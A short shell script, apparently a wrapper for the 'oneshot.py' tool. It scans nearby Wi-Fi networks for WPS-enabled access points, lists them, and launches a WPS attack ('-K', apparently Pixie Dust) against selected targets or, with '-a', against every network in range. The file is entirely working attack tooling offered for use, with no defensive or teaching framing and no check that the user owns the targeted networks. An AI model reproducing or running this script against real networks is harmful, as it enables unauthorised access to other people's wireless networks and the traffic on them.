#!/bin/sh

function usage()
{
	echo "Usage: $(basename $0) [options]"
	echo -e "-t <time>      \tScan timeout in seconds"
	echo -e "-i <interface> \tInterface name"
	echo -e "-a             \tAttack all targets"
	echo -e "-h             \tShow this help"
	exit
}

TIMEOUT=30
IFACE="wlan0"

while getopts "t:i:ha" opt
do
	case $opt in
		t)
			TIMEOUT=${OPTARG};;
		i)
			IFACE=${OPTARG};;
		a)
			ALL="1";;
		h)
			usage;;
		*)
			usage;;
	esac
done

echo "[*] Scanning networks around..."

TARGETS=$(iw dev $IFACE scan |\
awk -v iface="$IFACE)" '$3 == iface {MAC = $2;wifi[MAC]["BSSID"] = MAC};\
                        $1 == "SSID:" {wifi[MAC]["SSID"] = $2};\
                        $1 == "WPS:" {printf "%s\t%s\n",wifi[MAC]["BSSID"],wifi[MAC]["SSID"]}'|\
sed --expression='s/(on//g')

if [ "$TARGETS" ]
then
	echo
	echo "[+] Found targets:"
else
	echo "[-] No targets found"
	exit
fi

for BSSID in $(echo "$TARGETS" | awk '{print $1}')
do
	BSSIDS+=($BSSID)
done

for ESSID in $(echo "$TARGETS" | awk '{print $2}')
do
	ESSIDS+=($ESSID)
done

for TARGET in ${!BSSIDS[@]}
do
	echo -e "[$((${TARGET}+1))] ${BSSIDS[$TARGET]}\t${ESSIDS[$TARGET]}"
done

if [ ! $ALL ]
then
	echo -n "[*] Choose targets to attack (space separated) or 'all': "
	read CHOSEN
fi

if [ $CHOSEN = "all" ] || [ $ALL ]
then
	echo "[*] Attacking all targets!"
	CHOSEN=${!BSSIDS[@]}
	ALL="1"
fi


for TARGET in $CHOSEN
do
	if [ ! $ALL ]
	then
		TARGET=$(($TARGET-1))
	fi
	echo
	echo "[+] Shooting ${BSSIDS[$TARGET]} - ${ESSIDS[$TARGET]}"
	python oneshot.py --bssid ${BSSIDS[$TARGET]} -K -F -i $IFACE -w 2>/dev/null || true && killall sleep 2> /dev/null &
	
	if [ $TIMEOUT -gt 0 ]
	then
		sleep $TIMEOUT > /dev/null && echo "[-] Timeout!"
		PIDS="1"
		while [ "$PIDS" ]
		do
			PIDS=$(ps -ux | grep oneshot.py | grep -v grep | awk '{print $2}')
			for PID in $PIDS
			do
				kill -9 $PID > /dev/null
				echo "[*] Killed oneshot process"
			done
			sleep 1
		done
	fi

	wait
done

echo "[*] Jobs done!"
